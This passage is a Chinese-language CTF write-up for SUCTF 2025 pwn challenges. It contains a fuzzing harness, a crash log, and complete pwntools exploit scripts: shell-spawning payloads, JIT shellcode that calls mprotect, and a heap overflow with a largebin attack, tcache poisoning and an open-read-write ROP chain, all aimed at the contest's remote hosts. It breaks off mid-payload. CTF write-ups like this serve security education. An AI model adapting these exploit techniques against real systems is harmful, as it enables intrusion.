    ["invalid_input"]=1
    ["range_check"]=1
    ["division_by_zero"]=1
    ["stack_overflow"]=1
    ["heap_error"]=1
    ["other"]=1
)

# Function to get current timestamp
timestamp() {
    date "+%Y-%m-%d %H:%M:%S"
}

# Function to save crash with categorization
save_crash() {
    local error_type=$1
    local dir_name=$2
    local count=${error_counts[$error_type]}
    local file_name="crashes/$dir_name/crash_$count.txt"
  
    echo "[$(timestamp)] Found $error_type error #$count (exit code: $exit_code)"
  
    # Create crash file with timestamp
    echo "# $error_type error found at $(timestamp)" > "$file_name"
    echo "# Exit code: $exit_code" >> "$file_name"
  
    # Save both raw input and Python calls
    echo -e "\n# Full input sequence:" >> "$file_name"
    cat full_input.txt >> "$file_name"
  
    # Save program output
    echo -e "\n# Program output:" >> "$file_name"
    cat output.txt >> "$file_name"
  
    # Display output
    echo "Program output:"
    cat output.txt
  
    # Increment counter
    error_counts[$error_type]=$((count + 1))
}

echo "[$(timestamp)] Starting fuzzing process..."

while true; do
    # Generate random input and save both raw input and Python calls
    python3 gen_input.py > full_input.txt
  
    # Extract only the raw input part for feeding to the program
    sed -n '/^### RAW INPUT ###$/,/^$/p' full_input.txt | grep -v "^### RAW INPUT ###$" > input.txt
  
    # Run the program with timeout
    timeout 0.1s ./chall < input.txt &> output.txt
    exit_code=$?
  
    # Check if program crashed (ignore timeouts)
    if [ $exit_code -ne 0 ] && [ $exit_code -ne 124 ]; then
        if grep -q "EAccessViolation" output.txt; then
            save_crash "access_violation" "access_violations"
        elif grep -q "EInOutError: Invalid input" output.txt; then
            save_crash "invalid_input" "invalid_input"
        elif grep -q "ERangeError" output.txt || grep -q "Range check error" output.txt; then
            save_crash "range_check" "range_check"
        elif grep -q "EDivByZero" output.txt || grep -q "Division by zero" output.txt; then
            save_crash "division_by_zero" "division_by_zero"
        elif grep -q "EStackOverflow" output.txt || grep -q "Stack overflow" output.txt; then
            save_crash "stack_overflow" "stack_overflow"
        elif grep -q "EHeapError" output.txt || grep -q "EMMemory" output.txt || grep -q "Memory allocation" output.txt; then
            save_crash "heap_error" "heap_error"
        else
            # Check for specific error messages in the output
            if grep -q "Oops, maybe the sea" output.txt; then
                save_crash "invalid_input" "invalid_input"
            elif grep -q "No such big ocean" output.txt; then
                save_crash "range_check" "range_check"
            else
                save_crash "other" "other"
            fi
        fi
    fi
  
    # Cleanup temporary files
    rm input.txt full_input.txt output.txt
  
    # Show progress every 100 total crashes
    total_crashes=0
    for count in "${error_counts[@]}"; do
        total_crashes=$((total_crashes + count - 1))
    done
  
    if ((total_crashes % 100 == 0)) && ((total_crashes > 0)); then
        echo -e "\n[$(timestamp)] Progress Report:"
        echo "Total crashes found: $total_crashes"
        echo "Breakdown by type:"
        echo "  Access Violations: $((error_counts[access_violation] - 1))"
        echo "  Invalid Input: $((error_counts[invalid_input] - 1))"
        echo "  Range Check: $((error_counts[range_check] - 1))"
        echo "  Division by Zero: $((error_counts[division_by_zero] - 1))"
        echo "  Stack Overflow: $((error_counts[stack_overflow] - 1))"
        echo "  Heap Errors: $((error_counts[heap_error] - 1))"
        echo "  Other Crashes: $((error_counts[other] - 1))"
    fi
done 
```

输入生成器：

```Python
#!/usr/bin/env python3
import random

def gen_input():
    operations = []
    python_calls = []
  
    # Generate 1-20 random operations
    num_ops = random.randint(1, 20)
  
    for _ in range(num_ops):
        op = random.randint(1, 4)
        if op == 1:  # Open gate
            gate_type = random.randint(1, 2)
            operations.extend([1, gate_type])
            python_calls.append(f"open_gate({gate_type})")
        elif op == 2:  # Close gate
            gate_type = random.randint(1, 2)
            operations.extend([2, gate_type])
            python_calls.append(f"close_gate({gate_type})")
        elif op == 3:  # Create ocean
            size = random.randint(50, 2000)
            operations.extend([3, size])
            python_calls.append(f"create_ocean({size})")
        elif op == 4:  # Pull data
            amount = random.randint(50, 2000)
            gate_type = random.randint(1, 2)
            operations.extend([4, amount, gate_type])
            python_calls.append(f"pull_data({amount}, {gate_type})")
  
    # Print raw input numbers
    print("### RAW INPUT ###")
    for op in operations:
        print(op)
  
    # Print Python function calls
    print("\n### PYTHON CALLS ###")
    for call in python_calls:
        print(call)

if __name__ == "__main__":
    gen_input() 
```

会出现一个比较有意思的内存错误：

```Python
# access_violation error found at 2025-01-11 13:13:27
# Exit code: 217

# Full input sequence:
### RAW INPUT ###
3
1467
3
1821
1
1
3
1018
3
1967
4
1156
1
1
1
3
1197
3
1734
3
575
4
940
1
2
2
4
1799
2
3
112
4
327
2
1
2

### PYTHON CALLS ###
create_ocean(1467)
create_ocean(1821)
open_gate(1)
create_ocean(1018)
create_ocean(1967)
pull_data(1156, 1)
open_gate(1)
create_ocean(1197)
create_ocean(1734)
create_ocean(575)
pull_data(940, 1)
close_gate(2)
pull_data(1799, 2)
create_ocean(112)
pull_data(327, 2)
open_gate(2)

# Program output:
**GATES OF DATA**
1.OPEN A NEW GATE
2.CLOSE THE OLD GATE
3.CREATE OCEAN OF DATA
4.PULL DATA FROM GATE TO OCEAN
choice >
Please input the size of the data ocean.
No such big ocean.
**GATES OF DATA**
1.OPEN A NEW GATE
2.CLOSE THE OLD GATE
3.CREATE OCEAN OF DATA
4.PULL DATA FROM GATE TO OCEAN
choice >
Please input the size of the data ocean.
No such big ocean.
**GATES OF DATA**
1.OPEN A NEW GATE
2.CLOSE THE OLD GATE
3.CREATE OCEAN OF DATA
4.PULL DATA FROM GATE TO OCEAN
choice >
Which gate?
1.gate of byte
2.gate of text
Gate oppened.
**GATES OF DATA**
1.OPEN A NEW GATE
2.CLOSE THE OLD GATE
3.CREATE OCEAN OF DATA
4.PULL DATA FROM GATE TO OCEAN
choice >
Please input the size of the data ocean.
New ocean flowing.
**GATES OF DATA**
1.OPEN A NEW GATE
2.CLOSE THE OLD GATE
3.CREATE OCEAN OF DATA
4.PULL DATA FROM GATE TO OCEAN
choice >
Please input the size of the data ocean.
No such big ocean.
**GATES OF DATA**
1.OPEN A NEW GATE
2.CLOSE THE OLD GATE
3.CREATE OCEAN OF DATA
4.PULL DATA FROM GATE TO OCEAN
choice >
How much data?
Which gate?
1.gate of byte
2.gate of text
you have pulled 1156 bytes from the gate:
62 EC 21 34 92 24 D5 29:55 A6 BE B4 2B 6D D2 04 
E8 02 2B DF D5 53 E5 74:AB 7A DD 17 6C 70 01 5B 
4C 75 DF CC 49 61 20 D9:2E 96 5E A9 5B 85 92 E4 
E8 74 77 48 AB 08 3F AE:D5 94 B5 0E 24 45 37 B0 
CE 14 A1 56 5E 5C A6 12:8F D3 19 BD 17 B8 ED DD 
3E 11 03 7B 59 7B BC 10:9C D4 0E 06 A4 BA DD 44 
5D 27 42 67 2A EB 10 08:A1 A2 8A FB 8F 05 8E 94 
E5 8B 7B 1C 97 C4 CF AF:F9 67 07 27 42 68 D2 E5 
21 E1 BE 1D 36 6F 8A AF:11 4F 00 B1 CE 4D F4 5E 
B5 B7 71 8D 82 0E 4A 06:7F 45 40 D4 E1 75 0D F3 
4B E5 2F DD 30 35 8D 7B:97 07 86 43 28 7C 6D ED 
A3 77 0F 03 29 2B 60 45:F8 EC A0 E5 90 2F 2C E0 
F4 00 DE 04 5E 8B 1F 4B:20 9C A1 DB EA 42 D4 DB 
0E 45 BE 5A B9 5E 33 43:FB 75 40 42 2A 5B 99 AF 
8A D7 9D 99 77 E5 5D 1D:00 EE 74 71 0C 65 06 0F 
B9 59 0B CF B1 4E 6E 72:06 4A C0 B7 26 75 84 DB 
15 C4 93 5C 4D 36 34 E3:5F 6C C4 60 F1 3A FE 4B 
F0 83 73 06 02 89 CD A0:CA 9E F7 2F 55 B4 C9 59 
8C 02 EA D8 C3 E6 F3 D7:39 F7 6D 5A 49 AB 32 87 
23 5A B7 D0 8C 14 2E 0E:A7 A6 6A A4 30 B8 F5 22 
DE 47 69 87 8B C6 4C C6:5E 4D 6A 74 0E 55 6B D4 
D1 FF 81 3E 7A 2C 9D 4F:0E 96 2D 44 E4 05 6A A3 
E9 1F 77 33 83 42 95 A1:13 29 27 B6 B5 70 B4 C0 
88 96 39 81 FD B8 1E 1D:1E 79 09 03 39 10 C2 04 
C8 F2 15 2F BF 45 B2 B0:1E 42 90 BA BA 86 28 AE 
D5 FC 96 B0 3E 5F 65 38:EE 2A 64 7A 71 29 9C 17 
30 9F CA 86 73 51 F8 CB:38 8C 83 2E 05 31 47 5E 
35 BC 09 52 A1 F0 B9 71:3C 33 EF 55 CB EA 4B 5D 
79 B1 CE 10 40 D1 27 B3:A3 D8 28 EC CD 50 EF 9D 
DE A4 78 81 86 40 EA E5:BF 25 7B D6 BA 54 9B 92 
87 9E 1F EC 13 D2 0C D7:A2 CC E5 0B 62 B3 C5 6C 
90 00 1D F1 49 CD D2 FA:D9 3D 1F CA D4 21 21 27 
78 81 C3 56 C6 FD AA FF:52 F4 E9 1F A3 23 D1 FE 
D1 CB 00 B3 BD 5F 3A D6:08 CA EA 5E 0C 17 1C 65 
29 49 AB 5A 5C BF BC 68:C0 20 47 C9 21 4A 45 BE 
60 FC B4 E0 64 7D 4C 69:31 A2 84 EA F8 C6 D8 33 
A5 47 47 A9 8E B6 4B 46:14 CD 89 84 1B E3 72 63 
68 FB 7A 5C C9 F5 B2 B0:A9 21 07 80 98 75 9E CD 
A1 3E F5 9A F5 5F 1C 75:6C 11 C4 21 DE 5C 3F 5E 
A7 0F C8 C3 B6 AA 85 20:20 9F AE 7E EA 5D 27 E4 
24 33 4F 58 DA A2 64 69:01 D2 A2 18 74 70 3B D4 
8E 8F 35 6C DF 14 C6 57:D6 64 5D 03 49 24 6C B2 
B7 9F CC D1 CA A7 99 3F:C9 E0 45 F7 D4 D9 10 27 
7F 0A 67 88 C6 3E 9D DE:C9 10 12 5D 0C 14 73 9F 
61 5E 05 99 EA F5 A8 57:07 92 27 29 83 25 05 CC 
DB 7A FA 4F 40 FC 70 77:75 FE 42 D4 9D 71 4D 1F 
E9 64 47 AD 10 F3 B1 5B:3A E7 E2 8B 53 44 4D 08 
5B 66 4F AE C8 7A F2 AD:7B D7 FA 10 CD A7 3B 79 
93 33 05 AE A4 ED 0A 52:BB A1 74 06 8B 51 F3 D5 
5D DF DB 30 21 97 14 D9:F7 54 3E 8B AA 23 8F 7D 
60 94 66 DA AD E4 65 86:B1 07 5F D5 C3 A8 03 56 
BA FE 09 25 87 27 8A B6:21 EE 83 DA 98 32 7B 3C 
7B A4 07 9A 77 ED 74 F2:00 89 4A 5F 1F 95 68 10 
E9 75 AD 88 7F 54 BD 06:49 1E 52 EE B0 FC 49 13 
B6 06 40 A3 9D A1 74 69:70 FD 96 81 5E 0B 60 DA 
46 D2 3E 65 37 CD 2E 7D:B8 54 43 5B 82 51 AF 82 
E1 47 77 69 85 15 B7 96:E6 FB A3 24 B1 8E E6 AB 
BD 8B AB 8F 41 0E C9 D6:74 05 F3 1B 0E 59 CB 4A 
C0 E1 08 1F 62 F9 CD E1:D5 FB EE 5A 37 09 C2 FB 
31 A3 5C AB 53 7B 12 84:E6 27 58 EB F5 68 F4 CD 
39 C8 1F EB CD ED 2D CA:A2 0B 9E 06 81 AA 62 B4 
EC B4 2F E0 CC 3A 22 75:25 F8 C9 49 E8 3B 3C 2C 
AF 37 80 5B 4C 04 62 4E:58 DE C2 4B 62 D4 28 34 
21 3A BD CF CD 69 75 50:8B D3 B9 35 36 4B 20 7A 
9C 44 45 25 2B A0 BD 0C:8B 7A CD 19 31 81 42 99 
6B 74 80 BD A5 DE B3 6C:C6 63 A1 54 C2 62 61 E3 
F9 51 58 3B 77 C0 A8 E4:CC 3E 84 08 9B 09 B3 14 
9B CC 55 0F 87 25 4B 96:59 AC E2 24 4D 59 84 CD 
FA 5A A8 27 1E E7 32 7E:06 B5 5D 4E F1 13 7B 08 
AE 49 11 0E 07 D5 F4 8D:E2 18 EA 78 9E 1D 3A B0 
DF 6E E5 F9 93 37 0A CF:F4 D7 8C 3C AB 64 57 58 
69 89 18 DC 84 E2 66 A0:D4 0D ED 19 D6 A6 90 01 
D4 13 3B 7B 
**GATES OF DATA**
1.OPEN A NEW GATE
2.CLOSE THE OLD GATE
3.CREATE OCEAN OF DATA
4.PULL DATA FROM GATE TO OCEAN
choice >
Which gate?
1.gate of byte
2.gate of text
The gate of byte is watching you.
**GATES OF DATA**
1.OPEN A NEW GATE
2.CLOSE THE OLD GATE
3.CREATE OCEAN OF DATA
4.PULL DATA FROM GATE TO OCEAN
choice >
Please input the size of the data ocean.
No such big ocean.
**GATES OF DATA**
1.OPEN A NEW GATE
2.CLOSE THE OLD GATE
3.CREATE OCEAN OF DATA
4.PULL DATA FROM GATE TO OCEAN
choice >
Please input the size of the data ocean.
No such big ocean.
**GATES OF DATA**
1.OPEN A NEW GATE
2.CLOSE THE OLD GATE
3.CREATE OCEAN OF DATA
4.PULL DATA FROM GATE TO OCEAN
choice >
Please input the size of the data ocean.
An unhandled exception occurred at $000000000041A000:
EAccessViolation: Access violation
  $000000000041A000
  $0000000000401F3F

```

进一步分析可以提取出这个POC：

```Python
open_gate(1)
create_ocean(1018)
pull_data(1032, 1)
create_ocean(1)
```

进而找到漏洞点，当ocean\_cnt\>0x400的时候可以重新赋值ocean\_cnt，而不会新建一个堆：

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-09-17.png" alt="SUCTF_2025_Writeup-2025-01-14-16-09-17" position="center" style="border-radius: 1px;" >}}

这就导致`byte_gate`​输入的时候溢出：

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-09-21.png" alt="SUCTF_2025_Writeup-2025-01-14-16-09-21" position="center" style="border-radius: 1px;" >}}

不过溢出的是随机值：

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-09-26.png" alt="SUCTF_2025_Writeup-2025-01-14-16-09-26" position="center" style="border-radius: 1px;" >}}

堆上打开的是`text_gate`​和`byte_gate`​的文件结构体，存储了fd和一些files\_op指针：

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-09-33.png" alt="SUCTF_2025_Writeup-2025-01-14-16-09-33" position="center" style="border-radius: 1px;" >}}

因此可以得出思路：通过溢出一个字节以1/0x100的概率控制byte\_gate的文件描述符为0，这样可以在`pull to`​的时候从标准输入读取，实现任意向堆里写。进而通过溢出控制text\_gate的函数指针，中间有些值的调试会比较麻烦，同时要找到合适的gadget来实现弹shell：

```Python
#!/usr/bin/env python3

from pwn import *

filename = "./chall"
host = "1.95.131.201"
port = 10011
elf = context.binary = ELF(filename)
if filename:
    libc = ELF(filename)
gs = """
# b *0x4015C0
# b *0x419893
# b *0x419853
b *0x4019DC
# b *0x401AAF
# b *0x401A93
# b *0x401947
# b *0x41CAE0
# b *0x0421BB0
# b *0x41c710
b *0x454F0B
"""

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process(elf.path)

def pwn():
    p = start()

    def open_gate(gate_type):
        p.sendlineafter(b"choice >", b"1")
        p.sendlineafter(b"2.gate of text", str(gate_type).encode())
        info(f"Opened gate type {gate_type}")

    def close_gate(gate_type):
        p.sendlineafter(b"choice >", b"2")
        p.sendlineafter(b"2.gate of text", str(gate_type).encode())
        info(f"Closed gate type {gate_type}")

    def create_ocean(size):
        p.sendlineafter(b"choice >", b"3")
        p.sendlineafter(b"Please input the size of the data ocean.", str(size).encode())
        info(f"Created ocean of size {size}")

    def pull_data(amount, gate_type=None):
        p.sendlineafter(b"choice >", b"4")
        p.sendlineafter(b"How much data?", str(amount).encode())
        if gate_type:
            p.sendlineafter(b"2.gate of text", str(gate_type).encode())
        info(f"Pulled {amount} data")


    system_addr = 0x454E10
    call_rax_0x60 = 0x41382a
    binsh = 0x45EE70
    mov_edi_rax_call_rdx = 0x405240

    create_ocean(0x220)
    open_gate(1)
    open_gate(2)
    create_ocean(0x1000)
    pull_data(0x241, 1)

    payload = flat({
        0: cyclic(0x100),
        0x240: {
            0: p32(0) + p32(0xd7b3) + p64(1),
            0x70: p64(0x7600650064002f) + p64(0x6100720075002f) + p64(0x6d006f0064006e)
        },
        0x4e0: {
            0: p32(binsh) + p32(0xd7b1) + p64(0x100) + p64(0) + p64(system_addr) + p64(0)*2,
            0x30: p64(mov_edi_rax_call_rdx)*4,
        }
    })
    try:
        sleep(0.1)
        pull_data(len(payload)+1, 1)
        p.sendline(payload)
        pull_data(2, 2)
        p.interactive()
    except:
        p.close()
        info("try...")

while True:
    pwn()
```

### SU\_JIT16

逆向得出指令对应的汇编，通过jmp构造指令错位，可以实现2字节立即数shellcode，先mprotect，之后二次读即可：

```Python
#!/usr/bin/env python3

from pwn import *
import random

filename = "./chall"
host = "1.95.131.201"
port = 10001
elf = context.binary = ELF(filename)
if filename:
    libc = ELF(filename)
gs = """
b *$rebase(0x274D)
"""

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process(elf.path)
p = start()


asm2int = lambda x: u16(asm(x, arch='amd64').ljust(2, b'\x90'))

def opcode(op_func,op,reg1,reg2,pad=0):
    return p8((op_func<<4)+op)+p8((reg1<<4)+reg2)+p16(pad)

def jmp_0x13():
    return opcode(4, 4, 0, 4)

def clc():
    return opcode(8, 0, 0, 0)

def arb_2byte_asm(ins):
    return jmp_0x13() + clc() * 0xf + opcode(0, 1, 0, 0, asm2int(ins))

def mov_ax(word):
    return opcode(0, 1, 0, 0, word)

def mov_bx(word):
    return opcode(0, 1, 1, 0, word)

def mov_dx(word):
    return opcode(0, 1, 3, 0, word)
# def 

payload  = mov_ax(constants.SYS_mprotect)
payload += mov_dx(0x7)
payload += mov_bx(0x1000)
payload += arb_2byte_asm("push r8")
payload += arb_2byte_asm("pop rdi")
payload += arb_2byte_asm("push r8")
payload += arb_2byte_asm("pop rbx")
payload += arb_2byte_asm("pop rsi")
payload += arb_2byte_asm("syscall")
payload += mov_dx(0x100)
payload += arb_2byte_asm("push r8")
payload += arb_2byte_asm("pop rsi")
payload += arb_2byte_asm("xor edi, edi")
payload += arb_2byte_asm("xor eax, eax")
payload += arb_2byte_asm("syscall")
payload += arb_2byte_asm("push r8")
p.send(payload)

sleep(1)
p.send(asm(shellcraft.sh()))

p.interactive()
```

### SU\_text

a2 是指向chunk[index]的指针，其存放在栈上，注意sub\_1D5D下的操作会对该chunk指针+4

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-09-53.png" alt="SUCTF_2025_Writeup-2025-01-14-16-09-53" position="center" style="border-radius: 1px;" >}}

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-09-58.png" alt="SUCTF_2025_Writeup-2025-01-14-16-09-58" position="center" style="border-radius: 1px;" >}}

结合edit功能很明显存在一个堆溢出

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-10-07.png" alt="SUCTF_2025_Writeup-2025-01-14-16-10-07" position="center" style="border-radius: 1px;" >}}

那么首先利用load和write泄露出heap地址和libc地址

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-10-13.png" alt="SUCTF_2025_Writeup-2025-01-14-16-10-13" position="center" style="border-radius: 1px;" >}}

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-10-24.png" alt="SUCTF_2025_Writeup-2025-01-14-16-10-24" position="center" style="border-radius: 1px;" >}}

接着利用堆溢出构造largebin attack，修改mp\_.tcache\_bins为堆地址

那么我们此时释放的chunk都会进入tcache，接着就是利用堆溢出修改tcache 的fd指向`_IO_2_1_stdout_`​,申请到`_IO_2_1_stdout_`​泄露栈地址，然后再修改tcache 的fd指向`sub_1E5B`​的返回地址，写入orw链就行。

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-10-28.png" alt="SUCTF_2025_Writeup-2025-01-14-16-10-28" position="center" style="border-radius: 1px;" >}}

```Python
from pwn import *
context.arch='amd64'
context.log_level='debug'
filename = "SU_text"
libcname = "./libc.so.6"
host = "1.95.76.73"
port =  10011
elf = context.binary = ELF(filename)
if libcname:
   libc=ELF(libcname,checksec=False)
gs='''
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path,gdbscript=gs)
    elif args.REMOTE:
        return remote(host,port)
    else:
        return process(elf.path)
context.terminal=["tilix","-a","session-add-right","-e"]
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
lg = lambda s : info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
pr = lambda s : print('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
def mydbg():
    gdb.attach(p,gdbscript=gs)
    pause()
def alloc(index,size):
    return p8(1)+p8(16)+p8(index)+p32(size)

def delete(index):
    return p8(1)+p8(17)+p8(index)


def add(index,value1,value2,conti_flag=False):
    """
    result=value1+value2
    """
    if conti_flag:
        return p8(16)+p8(0x10)+p32(value1)+p32(value2)
    else:
        return p8(2)+p8(index)+p8(16)+p8(0x10)+p32(value1)+p32(value2)+p8(0)

def sub(index,value1,value2,conti_flag=False):
    """
    result=value1-value2
    """
    if conti_flag:
        return p8(16)+p8(0x11)+p32(value1)+p32(value2)
    else:
        return p8(2)+p8(index)+p8(16)+p8(0x11)+p32(value1)+p32(value2)+p8(0)

def mul(index,value1,value2,conti_flag=False):
    """
    result=value1*value2
    """
    if conti_flag:
        return p8(16)+p8(0x12)+p32(value1)+p32(value2)
    else:
        return p8(2)+p8(index)+p8(16)+p8(0x12)+p32(value1)+p32(value2)+p8(0)

def div(index,value1,value2,conti_flag=False):
    """
    result=value1/value2
    """
    if conti_flag:
        return p8(16)+p8(0x13)+p32(value1)+p32(value2)
    else:
        return p8(2)+p8(index)+p8(16)+p8(0x13)+p32(value1)+p32(value2)+p8(0)

def edit(index,offset,value,conti_flag=False):
    if conti_flag:
        return p8(16)+p8(0x14)+p32(offset)+p64(value)
    else:
        return p8(2)+p8(index)+p8(16)+p8(0x14)+p32(offset)+p64(value)+p8(0)

def load(index,offset,conti_flag=False):
    if conti_flag:
        return p8(16)+p8(0x15)+p32(offset)+p64(0)
    else:
        return p8(2)+p8(index)+p8(16)+p8(0x15)+p32(offset)+p64(0)+p8(0)

def show(index,offset):
    return p8(2)+p8(index)+p8(16)+p8(0x16)+p32(offset,sign=True)+p8(0)

def right_shift(index,value1,value2,conti_flag=False):
    """
    *result=value1>>value2
    result+=4
    """
    if conti_flag:
        return p8(17)+p8(0x10)+p32(value1)+p32(value2)
    else:
        return p8(2)+p8(index)+p8(17)+p8(0x10)+p32(value1)+p32(value2)+p8(0)

def left_shift(index,value1,value2,conti_flag=False):
    """
    *result=value1<<value2
    result+=4
    """
    if conti_flag:
        return p8(17)+p8(0x11)+p32(value1)+p32(value2)
    else:
        return p8(2)+p8(index)+p8(17)+p8(0x11)+p32(value1)+p32(value2)+p8(0)

def xor(index,value1,value2,conti_flag=False):
    """
    *result=value1^value2
    result+=4
    """
    if conti_flag:
        return p8(17)+p8(0x12)+p32(value1)+p32(value2)
    else:
        return p8(2)+p8(index)+p8(17)+p8(0x12)+p32(value1)+p32(value2)+p8(0)

def or_func(index,value1,value2,conti_flag=False):
    """
    *result=value1|value2
    result+=4
    """
    if conti_flag:
        return p8(17)+p8(0x13)+p32(value1)+p32(value2)
    else:
        return p8(2)+p8(index)+p8(17)+p8(0x13)+p32(value1)+p32(value2)+p8(0)

def and_func(index,value1,value2,conti_flag=False):
    """
    *result=value1|value2
    result+=4
    """
    if conti_flag:
        return p8(17)+p8(0x14)+p32(value1)+p32(value2)
    else:
        return p8(2)+p8(index)+p8(17)+p8(0x14)+p32(value1)+p32(value2)+p8(0)

def play_again():
    return p8(3)
def get_payload(index,offset,payload,conti_flag=False):
    if conti_flag:
        pay=b""
    else:
        pay=p8(2)+p8(index)
    for i in range(len(payload)//8):
        pay+=edit(index,i*8+offset,u64(payload[i*8:i*8+8]),True)
    return pay
p = start()
ru("Please input some text (max size: 4096 bytes):\n")
payload=alloc(0xf,0x418)+alloc(0,0x440)+alloc(1,0x460)+delete(0)+alloc(2,0x460)+alloc(0,0x418)
payload+=load(0,0)+show(0,-0x11)+load(0,0x10)+show(0,-0x11)+alloc(3,0x430)+alloc(4,0x440)+delete(0)+alloc(5,0x500)
payload+=play_again()

sl(payload)

libc_base=u64(rn(8).ljust(8,b"\x00"))-0x203f20
heap_base=u64(rn(8).ljust(8,b"\x00"))-0x6b0
origin_libc=libc_base+0x203f20
origin_heap=heap_base+0x6b0
lg("libc_base")
lg("heap_base")

read_addr=libc_base+libc.sym['read']
write_addr=libc_base+libc.sym['write']
magic_gadget=libc_base+0x17923d
syscall_ret=read_addr+0xf
pop_rax=libc_base+0x00000000000dd237
pop_rdi=libc_base+0x000000000010f75b
pop_rsi=libc_base+0x0000000000110a4d
pop_rbx=libc_base+0x00000000000586d4
mov_rdx=libc_base+0x00000000000b0123 #: mov rdx, rbx ; pop rbx ; pop r12 ; pop rbp ; ret

leave_ret=0x00000000000299d2+libc_base
pop_r12_r13=libc_base+0x00000000000584c7 #: pop r12 ; pop r13 ; ret



tcache_bins=libc_base+0x2031e8


ru("Please input some text (max size: 4096 bytes):\n")
payload=p8(2)+p8(0xf)
for i in range(0x40//4):
    payload+=xor(0xf,0,0,True)
pay1=flat(0x451,origin_libc,origin_libc,origin_heap,tcache_bins-0x20)
payload+=get_payload(0xf,0x3d8,pay1,True)
payload+=p8(0)+play_again()
sl(payload)

ru("Please input some text (max size: 4096 bytes):\n")
stdout=libc_base+libc.sym['_IO_2_1_stdout_']
key=(heap_base+0x1c80)>>12
fake_fd=key^stdout
# gdb.attach(p,api=True,gdbscript="""
# b *$rebase(0x01FD8)
# set $heap_list=$rebase(0x5068)
# """)
payload=delete(3)+alloc(0xe,0x500)+delete(0xe)+delete(0x5)+alloc(5,0x460)+alloc(6,0x460)+alloc(7,0x460)
payload+=p8(2)+p8(0x4)
for i in range(0x100//4):
    payload+=xor(0x4,0,0,True)
pay1=flat(0x511,fake_fd)
payload+=get_payload(0xf,0x348,pay1,True)
payload+=p8(0)+play_again()
sl(payload)
environ=libc_base+libc.sym['_environ']

ru("Please input some text (max size: 4096 bytes):\n")
payload=alloc(8,0x500)+alloc(9,0x500)
payload+=edit(9,0,0xfbad1800)+edit(9,8,0)+edit(9,0x10,0)+edit(9,0x18,0)+edit(9,0x20,environ)+edit(9,0x28,environ+8)
payload+=delete(7)+delete(6)+play_again()
sl(payload)
stack_addr=u64(rn(8))
ret_addr=stack_addr-0x168-0x10
lg("stack_addr")
lg("ret_addr")
ru("Please input some text (max size: 4096 bytes):\n")
key2=(heap_base+0x2b10)>>12
lg("key2")
fake_fd2=key2^ret_addr
payload=p8(2)+p8(0x5)
for i in range(0x100//4):
    payload+=xor(0x5,0,0,True)
pay1=flat(0x471,fake_fd2)
payload+=get_payload(0xf,0x368,pay1,True)
payload+=p8(0)+play_again()
sl(payload)
pop_rbx=0x00000000000586d4+libc_base #: pop rbx ; ret

mov_rdx_rbx_pop_3=0x00000000000b0123+libc_base#: mov rdx, rbx; pop rbx; pop r12; pop rbp; ret; 
orw=flat(pop_rdi,ret_addr+0xf0+0x18,pop_rsi,0,pop_rbx,0,mov_rdx_rbx_pop_3,0,0,0,pop_rax,2,syscall_ret,
         pop_rdi,3,pop_rsi,heap_base+0x500,pop_rbx,0x50,mov_rdx_rbx_pop_3,0,0,0,read_addr,
         pop_rdi,1,write_addr)
orw=orw.ljust(0xf0,b"\x00")+b"flag\x00\x00\x00\x00"
# print(orw)
ru("Please input some text (max size: 4096 bytes):\n")

payload=alloc(6,0x460)+alloc(7,0x460)+get_payload(7,0x18,orw)+p8(0)
sl(payload)
p.interactive()

```

### SU\_msg\_cfgd

逆向了大半天，结果测着测着找到段错误，是因为没有设置`vector_Config_end`​导致visit时找不到指针所以报错。

发现handleCMD中如果flag为1会设置`vector_Config_end`​

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-10-40.png" alt="SUCTF_2025_Writeup-2025-01-14-16-10-40" position="center" style="border-radius: 1px;" >}}

于是继续靠猜，发现如下payload会泄露出地址，存在一个UAF

```Python
dispatch([cmdAdd(b'geekcmore0'.ljust(0x20,b"a"), b'a'*0x20,1)])
dispatch([cmdAdd(b'geekcmore1'.ljust(0x20,b"a"), b'a'*0x20,1)])
dispatch([cmdAdd(b'geekcmore2'.ljust(0x20,b"a"), b'a'*0x20,1)])
dispatch([cmdAdd(b'geekcmore3'.ljust(0x20,b"a"), b'a'*0x20,1)])
dispatch([cmdAdd(b'geekcmore4'.ljust(0x20,b"a"), b'a'*0x20,1)])
dispatch([cmdAdd(b'geekcmore5'.ljust(0x20,b"a"), b'a'*0x20,1)])


dispatch([cmdDelete(b'geekcmore5'.ljust(0x20,b"a"), b'')])
dispatch([cmdDelete(b'geekcmore4'.ljust(0x20,b"a"), b'')])
